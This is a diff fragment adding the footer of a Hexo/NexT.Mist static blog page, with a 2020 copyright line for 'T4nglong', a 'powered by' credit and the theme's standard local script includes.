+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">T4nglong</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
